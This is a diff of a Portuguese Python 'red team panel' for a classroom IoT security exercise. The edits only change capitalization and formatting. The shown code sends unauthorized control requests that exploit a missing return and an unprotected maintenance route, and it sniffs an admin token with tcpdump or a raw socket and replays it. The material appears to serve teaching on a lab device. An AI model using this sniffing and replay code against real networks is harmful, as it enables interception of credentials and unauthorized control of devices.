@@ -2,9 +2,9 @@
 """
 Painel Interativo de Ataque (Red Team) - Atividade BIBIFI IoT
 Demonstração ao vivo das vulnerabilidades baseadas em Fulton et al. (CCS '22):
-  1. BREAK 1A: Mistake (falha de fluxo de controle / falta de return)
-  2. BREAK 1B: Some Intuitive No Implementation (rota /api/manutencao)
-  3. BREAK 2 : Sniffing real na rede (tcpdump / AF_PACKET) + Replay Attack
+  1. Break 1A: Mistake (falha de fluxo de controle / falta de return)
+  2. Break 1B: Some Intuitive No Implementation (rota /api/manutencao)
+  3. Break 2 : Sniffing real na rede (tcpdump / AF_PACKET) + Replay Attack
 
 Uso:
   sudo python3 ataques/painel_ataque_grupo.py
@@ -35,11 +35,11 @@ def cor(texto: str, codigo: str) -> str:
     return f"\033[{codigo}m{texto}\033[0m"
 
 
-def negrito(t: str) -> str: return cor(t, "1")
-def fraco(t: str) -> str:   return cor(t, "2")
-def verde(t: str) -> str:   return cor(t, "32")
-def amarelo(t: str) -> str: return cor(t, "33")
-def ciano(t: str) -> str:   return cor(t, "36")
+def negrito(t: str) -> str:  return cor(t, "1")
+def fraco(t: str) -> str:    return cor(t, "2")
+def verde(t: str) -> str:    return cor(t, "32")
+def amarelo(t: str) -> str:  return cor(t, "33")
+def ciano(t: str) -> str:    return cor(t, "36")
 def vermelho(t: str) -> str: return cor(t, "31")
 
 
@@ -75,15 +75,15 @@ def mostrar_status(host: str) -> dict:
     dados = obter_status(host)
     print(linha())
     if "erro" in dados:
-        print(f"  {amarelo('[AVISO]')} {dados['erro']}")
+        print(f"  {amarelo('[Aviso]')} {dados['erro']}")
         print(f"  {fraco('Verifique a conexão com o Wi-Fi SmartHome_IoT.')}")
     else:
         acesa = dados.get("luz_acesa")
-        estado = verde("ACESA (LED Azul ON)") if acesa else vermelho("APAGADA (LED Azul OFF)")
-        print(f"  {fraco('Luz Principal :')} {estado}")
-        print(f"  {fraco('Último Evento :')} {dados.get('ultimo_evento') or '-'}")
+        estado = verde("Acesa (LED azul ligado)") if acesa else vermelho("Apagada (LED azul desligado)")
+        print(f"  {fraco('Luz principal :')} {estado}")
+        print(f"  {fraco('Último evento :')} {dados.get('ultimo_evento') or '-'}")
         if "nonce_atual" in dados:
-            print(f"  {fraco('Nonce Atual   :')} {dados.get('nonce_atual')}")
+            print(f"  {fraco('Nonce atual   :')} {dados.get('nonce_atual')}")
     print(linha())
     return dados
 
@@ -130,7 +130,7 @@ def capturar_token_tcpdump(iface: str, ip_alvo: str, porta: int) -> str:
         cmd.insert(0, "sudo")
 
     print(f"  {fraco('Sniffer :')} {' '.join(cmd)}")
-    print(f"  {ciano('Aguardando o Admin executar OFF na rede... (Ctrl+C cancela)')}")
+    print(f"  {ciano('Aguardando o admin executar OFF na rede... (Ctrl+C cancela)')}")
 
     proc = subprocess.Popen(
         cmd,
@@ -145,10 +145,10 @@ def capturar_token_tcpdump(iface: str, ip_alvo: str, porta: int) -> str:
         for raw_line in proc.stdout:
             req_line, token = extrair_token_de_payload(raw_line)
             if token:
-                print(f"  {verde('[PACOTE CAPTURADO]')} {req_line}")
+                print(f"  {verde('[Pacote capturado]')} {req_line}")
                 return token
     except KeyboardInterrupt:
-        print(f"\n  {amarelo('[CANCELADO]')} Captura interrompida.")
+        print(f"\n  {amarelo('[Cancelado]')} Captura interrompida.")
     finally:
         proc.terminate()
         try:
@@ -159,19 +159,19 @@ def capturar_token_tcpdump(iface: str, ip_alvo: str, porta: int) -> str:
     if proc.returncode not in (0, None, -15, 130):
         err = proc.stderr.read().strip() if proc.stderr else ""
         if err:
-            print(f"  {amarelo('[AVISO tcpdump]')} {err}")
+            print(f"  {amarelo('[Aviso tcpdump]')} {err}")
     return ""
 
 
 def capturar_token_raw_socket(ip_alvo: str, porta: int) -> str:
     """Fallback em Python puro (Linux AF_PACKET) caso tcpdump não esteja instalado."""
     if os.geteuid() != 0:
-        print(f"  {amarelo('[ERRO]')} Sem tcpdump e sem privilégio root para AF_PACKET.")
+        print(f"  {amarelo('[Erro]')} Sem tcpdump e sem privilégio root para AF_PACKET.")
         print(f"  {fraco('Execute com: sudo python3 ataques/painel_ataque_grupo.py')}")
         return ""
 
     print(f"  {fraco('Sniffer :')} Linux AF_PACKET (porta {porta}, host {ip_alvo})")
-    print(f"  {ciano('Aguardando o Admin executar OFF na rede... (Ctrl+C cancela)')}")
+    print(f"  {ciano('Aguardando o admin executar OFF na rede... (Ctrl+C cancela)')}")
 
     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     try:
@@ -200,10 +200,10 @@ def capturar_token_raw_socket(ip_alvo: str, porta: int) -> str:
             payload = raw_data[tcp_start + doff:].decode("utf-8", errors="ignore")
             req_line, token = extrair_token_de_payload(payload)
             if token:
-                print(f"  {verde('[PACOTE CAPTURADO]')} {req_line}")
+                print(f"  {verde('[Pacote capturado]')} {req_line}")
                 return token
     except KeyboardInterrupt:
-        print(f"\n  {amarelo('[CANCELADO]')} Captura interrompida.")
+        print(f"\n  {amarelo('[Cancelado]')} Captura interrompida.")
     finally:
         sock.close()
     return ""
@@ -227,49 +227,49 @@ def capturar_token_rede(host: str) -> str:
 
 
 def ataque_break_1a_mistake(host: str) -> bool:
-    cabecalho_secao("BREAK 1A — Mistake (Fluxo de Controle em /luz)")
+    cabecalho_secao("Break 1A — Mistake (Fluxo de controle em /luz)")
     url = f"{host}/luz?acao=OFF&user=visitante"
-    print(f"  {fraco('GET')}  {url}")
+    print(f"  {fraco('GET     :')} {url}")
     codigo, resp = requisicao_http(url)
-    print(f"  {fraco('HTTP')} [{codigo}] {resp}")
+    print(f"  {fraco('HTTP    :')} [{codigo}] {resp}")
 
     dados = mostrar_status(host)
     if not dados.get("luz_acesa", True) and "erro" not in dados:
-        print(f"  {verde('[EXPLORADO]')} Alerta disparado, mas faltou 'return;' após o bloqueio.")
+        print(f"  {verde('[Explorado]')} Alerta disparado, mas faltou 'return;' após o bloqueio.")
         print(f"  {fraco('Artigo: Mistake (Control Flow Error)')}")
         return True
 
-    print(f"  {amarelo('[BLOQUEADO]')} A rota /luz impediu o desligamento pelo visitante.")
+    print(f"  {amarelo('[Bloqueado]')} A rota /luz impediu o desligamento pelo visitante.")
     return False
 
 
 def ataque_break_1b_rota_esquecida(host: str) -> bool:
-    cabecalho_secao("BREAK 1B — No Implementation (Rota /api/manutencao)")
+    cabecalho_secao("Break 1B — No Implementation (Rota /api/manutencao)")
     url = f"{host}/api/manutencao?cmd=apagar_tudo"
-    print(f"  {fraco('GET')}  {url}")
+    print(f"  {fraco('GET     :')} {url}")
     codigo, resp = requisicao_http(url)
-    print(f"  {fraco('HTTP')} [{codigo}] {resp}")
+    print(f"  {fraco('HTTP    :')} [{codigo}] {resp}")
 
     dados = mostrar_status(host)
     if codigo == 200 and not dados.get("luz_acesa", True):
-        print(f"  {verde('[EXPLORADO]')} Rota auxiliar executou sem validação de acesso.")
+        print(f"  {verde('[Explorado]')} Rota auxiliar executou sem validação de acesso.")
         print(f"  {fraco('Artigo: Some Intuitive No Implementation')}")
         return True
 
-    print(f"  {amarelo('[BLOQUEADO]')} A rota /api/manutencao está protegida.")
+    print(f"  {amarelo('[Bloqueado]')} A rota /api/manutencao está protegida.")
     return False
 
 
 def ataque_break_2_replay(host: str, token_manual: str = "") -> bool:
     global TOKEN_CAPTURADO
-    cabecalho_secao("BREAK 2 — Sniffing Real + Replay Attack")
+    cabecalho_secao("Break 2 — Sniffing real + Replay Attack")
 
     token = token_manual or TOKEN_CAPTURADO
     if not token:
         token = capturar_token_rede(host)
 
     if not token:
-        print(f"  {amarelo('[SEM TOKEN]')} Nenhum token capturado.")
+        print(f"  {amarelo('[Sem token]')} Nenhum token capturado.")
         return False
 
     TOKEN_CAPTURADO = token
@@ -278,15 +278,15 @@ def ataque_break_2_replay(host: str, token_manual: str = "") -> bool:
     print(f"  {fraco('Replay  :')} {url_replay}")
 
     codigo, resp = requisicao_http(url_replay)
-    print(f"  {fraco('HTTP')}    [{codigo}] {resp}")
+    print(f"  {fraco('HTTP    :')} [{codigo}] {resp}")
 
     dados_pos = mostrar_status(host)
     if codigo == 200 and not dados_pos.get("luz_acesa", True):
-        print(f"  {verde('[EXPLORADO]')} LED Azul apagado via replicação, sem saber a senha!")
+        print(f"  {verde('[Explorado]')} LED azul apagado via replicação, sem saber a senha.")
         print(f"  {fraco('Artigo: Misunderstanding + Unintuitive No Implementation (sem Nonce)')}")
         return True
 
-    print(f"  {amarelo('[BLOQUEADO]')} Token recusado — controlador protegido com Nonce único.")
+    print(f"  {amarelo('[Bloqueado]')} Token recusado — controlador protegido com Nonce único.")
     return False
 
 
@@ -311,7 +311,7 @@ def tratar_opcao_replay(host: str) -> None:
             if resp != "g":
                 ataque_break_2_replay(host, token_manual=token)
         else:
-            manual = input("  Deseja colar um token do Wireshark manualmente? (Enter pula) > ").strip()
+            manual = input("  Deseja colar um token manualmente? (Enter pula) > ").strip()
             if manual:
                 ataque_break_2_replay(host, token_manual=manual)
 
@@ -319,7 +319,7 @@ def tratar_opcao_replay(host: str) -> None:
 def menu_interativo(host: str) -> None:
     while True:
         print(f"\n{linha('═')}")
-        print(f"  {negrito('PAINEL RED TEAM')} {fraco('— BIBIFI IoT (Fulton et al., CCS 22)')}")
+        print(f"  {negrito('Painel Red Team')} {fraco('— BIBIFI IoT (Fulton et al., CCS 22)')}")
         print(f"  {fraco('Alvo  :')} {ciano(host)}")
         cache_str = verde(TOKEN_CAPTURADO) if TOKEN_CAPTURADO else fraco("(nenhum)")
         print(f"  {fraco('Token :')} {cache_str}")
